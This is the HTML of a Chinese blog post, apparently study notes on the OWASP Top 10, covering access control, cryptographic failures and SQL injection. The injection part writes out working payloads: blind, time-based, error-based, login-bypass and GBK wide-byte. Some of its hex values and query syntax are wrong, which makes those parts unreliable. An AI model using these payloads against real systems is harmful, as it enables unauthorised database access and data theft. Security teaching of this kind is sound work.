@@ -1,0 +1,540 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>OWASP-TOP-10 | Depicter</title><meta name="author" content="fanhao"><meta name="copyright" content="fanhao"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="OWASP TOP 1001 访问控制崩溃 - Broken Access Control概述​        通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用该漏洞去查看未授权的功能和数据。产生越权、未授权访问等问题。 eg: 访问用户的账户、敏感文件、获取和正常用户相同的权限等 越权​		未对通过身份验证的用户实施恰当的访问控制，攻击者可以利用这些缺陷访问">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OWASP-TOP-10">
+<meta property="og:url" content="https://crappier.github.io/2024/03/06/OWASP-TOP-10/index.html">
+<meta property="og:site_name" content="Depicter">
+<meta property="og:description" content="OWASP TOP 1001 访问控制崩溃 - Broken Access Control概述​        通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用该漏洞去查看未授权的功能和数据。产生越权、未授权访问等问题。 eg: 访问用户的账户、敏感文件、获取和正常用户相同的权限等 越权​		未对通过身份验证的用户实施恰当的访问控制，攻击者可以利用这些缺陷访问">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://crappier.github.io/img/cover/cover_2.jpg">
+<meta property="article:published_time" content="2024-03-06T00:55:41.000Z">
+<meta property="article:modified_time" content="2024-03-13T11:03:38.039Z">
+<meta property="article:author" content="fanhao">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://crappier.github.io/img/cover/cover_2.jpg"><link rel="shortcut icon" href="/img/dinosaur.png"><link rel="canonical" href="https://crappier.github.io/2024/03/06/OWASP-TOP-10/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'OWASP-TOP-10',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-13 19:03:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/cover/cover_2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Depicter"><span class="site-name">Depicter</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">OWASP-TOP-10</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-06T00:55:41.000Z" title="发表于 2024-03-06 08:55:41">2024-03-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-13T11:03:38.039Z" title="更新于 2024-03-13 19:03:38">2024-03-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="OWASP-TOP-10"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h1><h2 id="01-访问控制崩溃-Broken-Access-Control"><a href="#01-访问控制崩溃-Broken-Access-Control" class="headerlink" title="01 访问控制崩溃 - Broken Access Control"></a>01 访问控制崩溃 - Broken Access Control</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>​        通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用该漏洞去查看未授权的功能和数据。<strong>产生越权、未授权访问等问题</strong>。</p>
+<p>eg: 访问用户的账户、敏感文件、获取和正常用户相同的权限等</p>
+<h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>​		未对通过身份验证的用户实施恰当的访问控制，攻击者可以利用这些缺陷访问未经授权的功能和数据，eg:访问其他用户的账户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
+<p>水平越权(同级别越权)：也叫做访问控制攻击，攻击者可以通过更换如id一类的身份标识，从而获取&#x2F;修改不属于自己的数据</p>
+<p>垂直越权(跨级别越权)：也叫做权限提升攻击，攻击者使用低权限身份的账号，发送高权限账号才能有的请求，获取其最高权限的行为</p>
+<h3 id="弱点描述"><a href="#弱点描述" class="headerlink" title="弱点描述"></a>弱点描述</h3><p>​		存取控制強化政策，使用户不能采取在预期权限之外的行动。控制失效通常会导致未经授权的信息泄漏、修改或损坏所有资料，或执行超出用户权限的业务功能。</p>
+<ul>
+<li>通过修改 url、内部应用程序的状态或 html 页面绕过访问控制检查，或者简单使用自定义的 api 攻击工具</li>
+<li>将主键更改为其他用户的记录，查看或编辑他人的账户</li>
+<li>特权提升，在不登录的情况下假扮用户，或以用户身份登陆时充当管理员</li>
+<li>元数据操作，如重放或篡改 json 网站令牌(JWT)的存取控制令牌，或被操纵以提升特权后滥用 JWT 失效的 cookie 或隐藏域内容</li>
+<li>CORS 错误配置允许未经授权的 api 存取</li>
+<li>以未通过身份验证的用户身份强制浏览通过身份验证时才能看到的页面，或作为标准用户访问具有相关权限的页面，或 api 没有对 post、put、delete 强制执行访问控制</li>
+</ul>
+<h3 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h3><p>​		访问控制只有在受信服务器端代码或没有服务器的 api 中有效，这样攻击者才无法修改访问控制检查或元数据</p>
+<ul>
+<li>除公有资源外，默认情况下拒绝访问</li>
+<li>一次性地建立存取控制机制，之后在整个应用程序中重复使用，包括最大限度地减少使用 CORS</li>
+<li>严格判断权限，用户只能操作属于自己的内容(可能会产生身份伪造的问题)</li>
+<li>记录失败的访问控制(历史留存存档)，并适时向管理员告警</li>
+<li>对 api 和控制器的访问进行速率限制，以最大化限度降低自动化攻击工具的危害</li>
+<li>当用户注销后，服务器上的 JWT 令牌应当失效</li>
+</ul>
+<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>​        CORS（Cross-Origin Resource Sharing）是一种用于在浏览器和服务器之间进行跨域资源共享的机制。在网页开发中，由于同源策略的限制，浏览器默认情况下不允许跨域请求。而通过CORS机制，服务器可以告诉浏览器是否允许其他来源的网页访问自己的资源，从而实现跨域资源共享。</p>
+<p>​        CORS通过在HTTP响应头中添加一些字段来进行控制，比如Access-Control-Allow-Origin、Access-Control-Allow-Methods等。当浏览器发起跨域请求时，会先发送一个OPTIONS预检请求，服务器返回的响应中包含CORS相关的头信息，告诉浏览器是否允许实际的跨域请求。</p>
+<p>​       可以通过设置服务器端的配置来控制CORS策略，以实现安全可控的跨域资源共享。</p>
+<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>​        JWT（JSON Web Token）是一种开放标准（RFC 7519），用于在网络上以 JSON 对象的形式安全地传输信息。JWT 由三部分组成，分别是头部（Header）、载荷（Payload）和签名（Signature）。这三部分会用点号（.）连接在一起，形成一个形如<code>xxx.yyy.zzz</code>的字符串。</p>
+<ul>
+<li><strong>头部（Header）</strong>包含了描述关于该Token的类型和签名算法的信息；</li>
+<li><strong>载荷（Payload）</strong>包含了要传递的信息，比如用户的身份信息、权限等；</li>
+<li><strong>签名（Signature）</strong>用于验证Token的真实性。</li>
+</ul>
+<p>​        JWT 通常用于在用户和服务器之间传递身份信息，以及验证发送者的真实性。当用户登录成功后，服务器可以生成一个 JWT 令牌，并将其返回给客户端。客户端在后续的请求中携带这个 JWT 令牌，服务器通过验证 JWT 的签名来确认用户的身份和权限。</p>
+<p>​        JWT 具有自包含性、可扩展性和数字签名验证等特点，在前后端分离的应用中被广泛使用。但需要注意的是，JWT 虽然可以加密数据，但不适合存储敏感信息，因为 JWT 的内容可以被解码。</p>
+<h2 id="02-加密失效-Cryptographic-Failures"><a href="#02-加密失效-Cryptographic-Failures" class="headerlink" title="02 加密失效 -  Cryptographic Failures"></a>02 加密失效 -  Cryptographic Failures</h2><p>​	     早期版本称为“敏感数据暴露”，是一种广泛的症状而非根本因素。实际上是密码学相关的失效(或缺乏加密)，常常导致敏感信息的泄露。</p>
+<h3 id="弱点描述-1"><a href="#弱点描述-1" class="headerlink" title="弱点描述"></a>弱点描述</h3><ul>
+<li>明文形式传输数据，如 http、smtp、ftp等协议，使用外部网络流量是危险的。在内部传输中，必须验证所有的内部流量，如负载均衡器、网站服务器、后端程序中</li>
+<li>加密算法老旧或存在缺点</li>
+<li>使用默认的加密密钥，或重复使用弱加密密钥，密钥管理不当，源代码暴露密钥</li>
+<li>未进行强制加密</li>
+<li>服务器证书以及信任链未正确验证</li>
+</ul>
+<h3 id="防护措施-1"><a href="#防护措施-1" class="headerlink" title="防护措施"></a>防护措施</h3><ul>
+<li>对应用程序处理、存储、传输的信息数据进行分类，根据相关法令法规或商业需求，确定敏感数据，并加以保护</li>
+<li>依照分类执行相应的控制措施</li>
+<li>非必要不存储敏感性数据</li>
+<li>确保所有静态敏感数据加密</li>
+<li>使用最新且标准的加密算法、协议以及密钥；使用适当的密钥管理</li>
+<li>使用安全的协议加密传输中的信息</li>
+<li>针对敏感数据停用缓存</li>
+</ul>
+<h3 id="防止敏感信息泄露"><a href="#防止敏感信息泄露" class="headerlink" title="防止敏感信息泄露"></a>防止敏感信息泄露</h3><ul>
+<li><strong>加强员工意识</strong>，禁止上传代码到 github 等网站</li>
+<li>谨慎使用第三方云服务，不要把工作相关内容存放到云端</li>
+<li>禁止使用工作邮箱注册非工作相关的网站</li>
+</ul>
+<h2 id="03-注入攻击-Injection"><a href="#03-注入攻击-Injection" class="headerlink" title="03 注入攻击 - Injection"></a>03 注入攻击 - Injection</h2><p>​		注入是指 web 应用程序对用户输入数据的合法性没有判断或过滤不严格，攻击者可以在 web 应用程序中事先定义好的语句的结尾上添加额外的执行语句，在管理者不知情的状况下实现非法操作，以此来实现欺骗数据库服务器\网站系统，执行非授权的任意操作，从而进一步得到相应的数据信息。</p>
+<h3 id="3-1-SQL注入"><a href="#3-1-SQL注入" class="headerlink" title="3.1 SQL注入"></a>3.1 SQL注入</h3><p>​		通过把 SQL 命令插入到 web 表单提交、输入域名、页面请求的查询字符串中，达到欺骗服务器执行恶意 SQL 命令的目的的入侵行为，<strong>所有与用户进行交互的地方都可能存在注入</strong>。</p>
+<h4 id="SQL注入的类型-MySQL"><a href="#SQL注入的类型-MySQL" class="headerlink" title="SQL注入的类型(MySQL)"></a>SQL注入的类型(MySQL)</h4><blockquote>
+<p>  对于MySQL 5.0 以下的版本，没有<code>information_schema</code>数据库，只在MySQL 5.0 及更高版本中引入，提供方便的元数据访问和查询方式。</p>
+<p>  <code>information_schema.schemata(数据库信息)| tables(表信息)| columns(列信息)| </code></p>
+</blockquote>
+<h5 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h5><p>​		攻击者在查询条件中注入数字值，通过条件的真假来获取信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1</span><br><span class="line">1 and 1=2</span><br></pre></td></tr></table></figure>
+
+<h5 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h5><p>攻击者在查询条件中注入字符串值，通过条件的真假来获取信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 单引号注入</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2&#x27;</span><br><span class="line"># 双引号注入</span><br><span class="line">1&quot; and &quot;1&quot;=&quot;1&quot;</span><br><span class="line">1&#x27; and &quot;1&quot;=&quot;2&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h5><p>假如有一个网站：<code>www.xxx.com/data.php?id=x</code>，输入参数 <code>x</code> 为整型，我们可以输入以下内容：</p>
+<ul>
+<li><code>www.xxx.com/data.php?id=x and 1=1</code>，页面正常显示，继续下一步<ul>
+<li><code>SELECT * FROM users WHERE id = x AND 1=1;</code> 没有语法错误，逻辑判断正确，返回正常</li>
+</ul>
+</li>
+<li><code>www.xxx.com/data.php?id=x and 1=2</code>，如果页面出现错误，说明存在数字型注入<ul>
+<li><code>SELECT * FROM users WHERE id = x AND 1=2;</code> 没有语法错误，逻辑判断为假，返回错误</li>
+</ul>
+</li>
+</ul>
+<p>假如有一个网站：<code>www.yyy.com/data.php?id=x</code>，输入参数 <code>x</code> 为字符型，我们可以输入以下内容：</p>
+<ul>
+<li><code>www.xxx.com/data.php?id=1&#39; and &#39;1&#39;=&#39;1</code>，页面正常显示，继续下一步<ul>
+<li><code>SELECT * FROM users WHERE id=&#39;x&#39; and &#39;1&#39;=&#39;1&#39;;</code> 语法正确，逻辑判断正确，返回正确</li>
+</ul>
+</li>
+<li><code>www.xxx.com/data.php?id=1&#39; and &#39;1&#39;=&#39;2</code>，如果页面出现错误，说明存在字符型注入<ul>
+<li><code>SELECT * FROM users WHERE id=&#39;x&#39; and &#39;1&#39;=&#39;2&#39;;</code> 语法正确，逻辑判断错误，返回错误。</li>
+</ul>
+</li>
+</ul>
+<p>​		字符型和数字型最大的区别在于，数字型不需要单引号来闭合，而字符型一般需要通过单引号来闭合。</p>
+<h5 id="联合-Union-注入"><a href="#联合-Union-注入" class="headerlink" title="联合(Union)注入"></a>联合(Union)注入</h5><p>​		在 SQL 注入中， <code>order by</code> 测试列数的原理是利用数据库中 <code>order by</code> 语句对结果集进行排序的规则。<code>order by</code> 用于指定排序的列，如果没有指定排序方式，默认按升序排列。攻击者可以构造带有 <code>order by</code> 语句的 SQL 语句，通过观察返回结果的变化来判断表中的列数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name order by n;</span><br></pre></td></tr></table></figure>
+
+<p>​		通过改变 <code>order by</code> 语句逐渐确定列表中的列数，当找到所有列后，就可以构造合法的 SQL 注入语句。<strong>不仅要保证列数一致，还要保证数据类型相似</strong></p>
+<p>​		在 MySQL 中，使用 <code>union select</code> 时，后面可以省略指定表格名字，直接使用 <code>NULL</code> 或者数字代替列名，<strong>必须确保合并两边的列数是一致的</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ... from table_name union select null,null...;</span><br></pre></td></tr></table></figure>
+
+<p>​		通过在第二个 select 语句中使用 <code>null</code> 进行占位，攻击者可以不指定具体的列名，而是通过观察返回的结果逐渐确定表格的列数，在进行 <code>union</code> 注入时使用，以构造有效的sql注入语句。</p>
+<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>​		攻击者并不直接看到数据库返回的信息，而是通过观察应用程序对用户输入的不同响应来推断数据库中的数据。由于在某些情况下(信息不回显)，攻击者无法获取到数据库返回的数据，但仍能够利用应用程序的响应来进行信息收集和攻击。</p>
+<h6 id="导致盲注的常见原因"><a href="#导致盲注的常见原因" class="headerlink" title="导致盲注的常见原因"></a>导致盲注的常见原因</h6><ul>
+<li><strong>错误信息未显示</strong>，在某些情况下，应用程序可能配置为不向用户显示详细的错误信息，这使得攻击者无法通过错误信息直接获取数据库信息，此时，攻击者可以尝试使用盲注来推断信息</li>
+<li><strong>输出被过滤</strong>，有些应用程序对输出进行过滤，防止攻击者通过错误信息直接获取敏感信息</li>
+<li><strong>黑盒测试场景</strong>，在黑盒测试中，渗透人员通常无法直接访问数据库，但仍希望验证是否存在 sql 注入漏洞，可以通过盲注的手段进行判断</li>
+<li><strong>获取数据长度</strong>，攻击者可能无法直接获取数据库中的数据，但是可以通过盲注逐步获取数据的长度</li>
+</ul>
+<h6 id="布尔注入-布尔盲注"><a href="#布尔注入-布尔盲注" class="headerlink" title="布尔注入(布尔盲注)"></a>布尔注入(布尔盲注)</h6><p>​		布尔盲注是一种 sql 注入攻击的形式，与普通的 sql 注入不同在于，攻击者无法直接获取数据库返回的数据，而是通过观察应用程序的行为，根据不同的条件判断结果是否为真来逐步推断数据库中的信息。为提高效率，攻击中常使用二分法逼近条件，从而更快地确定字符是否符合某一条件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 通过构造条件判断语句，逐步推断数据库名称信息</span><br><span class="line">select ... from table_name where name=&#x27;xxx&#x27; and ascii(substring(database()),1,1) &gt; 64;</span><br><span class="line"># 盲注用户名称</span><br><span class="line">and substring(user(),1,1) = &#x27;r&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="延时注入-时间盲注"><a href="#延时注入-时间盲注" class="headerlink" title="延时注入(时间盲注)"></a>延时注入(时间盲注)</h6><p>​		时间盲注是一种 sql 注入攻击的类型，与普通的 sql 注入不同在于，它利用了数据库在执行时产生的时间延迟来推断查询条件的真假</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name where name=&#x27;xxx&#x27; and if(1=1, sleep(5), 0);</span><br><span class="line"># 盲注表名</span><br><span class="line">and if(ascii(substring((select table_name from information_schema.tables </span><br><span class="line">where table_schema=database() limit 0,1),1,1)=1, sleep(5),1)) -- -</span><br></pre></td></tr></table></figure>
+
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>​		报错注入是一种 sql 注入攻击的形式，攻击者通过构造恶意的 sql 语句，使得数据库执行时产生错误信息，进而泄露敏感信息</p>
+<h6 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># floor报错注入</span><br><span class="line">select count(*), floor(rand(0)*2) x from users group by x;</span><br></pre></td></tr></table></figure>
+
+<h6 id="固定报错注入"><a href="#固定报错注入" class="headerlink" title="固定报错注入"></a>固定报错注入</h6><p>​		rand() 加入随机数种子之后，产生的序列才是可预测的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 固定报错</span><br><span class="line"># from information_schema 是为了rand()产生足够多次数的运算</span><br><span class="line">select count(*), concat(&#x27;~&#x27;,(select database()),floor(rand(0)*2)) as a from information_schema group by a;</span><br></pre></td></tr></table></figure>
+
+<h6 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h6><p>​		<code>extractvalue()</code> 是MySQL 中对 XML 文档数据进行查询的 xpath 函数</p>
+<blockquote>
+<p>  extractvalue(xml_frag, xml_expr)<br>      xml_frag：传入目标 xml 文件<br>      xml_expr：利用 xpath 路径法表示的查找路径</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前数据库, 0x7e=&#x27;~&#x27;</span><br><span class="line">and extractvalue(1, concat(0x7e,(select database()), 0x7e)) -- -</span><br></pre></td></tr></table></figure>
+
+<h6 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h6><p>​		<code>updatexml()</code> 是 MySQL 中对 XML 稳定数据进行查询和修改的 xpath 函数，updatexml 能查询字符串的最大长度为 32，如果查询结果长度大于32，则需要使用 substring 函数截取。</p>
+<blockquote>
+<p>  updatexml(xml_doc, xpath_str,new_val)<br>      xml_doc：xml 文档对象名称<br>      xpath_str：xpath 格式字符串<br>      new_val：替换查找到符合条件的字符串</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前数据库用户</span><br><span class="line">and updatexml(1, concat(0x7e,(select user()),0x7e), 1) -- -</span><br></pre></td></tr></table></figure>
+
+<h5 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h5><p>​		POST 注入是一种 sql 注入攻击类型，与 GET 注入相对应。在 POST 注入中， 攻击者利用应用程序接收到用户提交的 POST 请求参数中的漏洞，注入恶意的 sql 代码</p>
+<blockquote>
+<p>  User-Agent、Referer、Cookie注入</p>
+</blockquote>
+<p>基本原理和步骤：</p>
+<ul>
+<li><strong>构造恶意的POST请求</strong>，修改 POST 请求中的参数值，注入包含恶意 sql 代码的内容</li>
+<li><strong>寻找注入点</strong>，在 POST 请求中通常存在一些参数用于传递用户输入的数据</li>
+<li><strong>构造恶意sql语句</strong>，构造包含恶意 sql 代码的语句，将其嵌入到 POST 请求参数中</li>
+<li><strong>观察应用程序响应</strong>，观察应用程序对恶意请求的响应，判断是否成功执行了注入的 sql 代码，从而推断数据库结构和获取敏感信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: xxx.com</span><br><span class="line">Content-Type: application/x-www-from-urlencoded</span><br><span class="line"></span><br><span class="line">username=andim&#x27; or &#x27;1&#x27;=&#x27;1&#x27; -- </span><br><span class="line">password=123456</span><br></pre></td></tr></table></figure>
+
+<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>宽字节注入是一种针对数据库的安全漏洞攻击技术，它通常在使用旧版本的数据库或配置不正确的情况下发生。它主要影响的是使用双字节字符集编码（如GBK）的数据库。</p>
+<blockquote>
+<p>  对于使用其他字符集编码的数据库，如UTF-8，宽字节注入不起作用。因为UTF-8编码使用变长字节表示字符，每个中文字符通常由3个字节表示，而不是2个字节。在UTF-8编码中，%00会被解释为字符串的结束，这降低了宽字节注入攻击的可行性。</p>
+</blockquote>
+<h6 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h6><ul>
+<li>当某字符的大小为一个字节时，称其为窄字节</li>
+<li>当某字符的大小为两个字节时，称其为宽字节</li>
+<li>所有英文默认占一个字节，汉字占两个字节</li>
+</ul>
+<blockquote>
+<p>  addslashes() 	函数返回在预定义字符之前添加反斜杠的字符串 mysql_real_escape_string() 	函数转义 SQL 语句中使用的字符串中的特殊字符 mysql_escape_string() 	转义一个字符串</p>
+</blockquote>
+<p>为了防止 SQL 注入，在 SQL 执行前会将用户输入进行转义，比如将原本输入的：<code>1&#39;</code> 转义为 <code>1\&#39;</code>，这样就无法达到闭合的情况，使得无法注入成功，<code>&#39;</code> 的 16 进制结果为 <code>0x2f</code> , 在其前面再添加一个字符 <code>0xdf</code> ，此时为 <code>0xdf0x2f</code> 在GBK解码中为 <code>綅</code>。此时的用户输入就是 <code>1%df&#39;</code> 在数据库解析时就变成了 <code>1綅&#39;</code>，单引号没有被转义。</p>
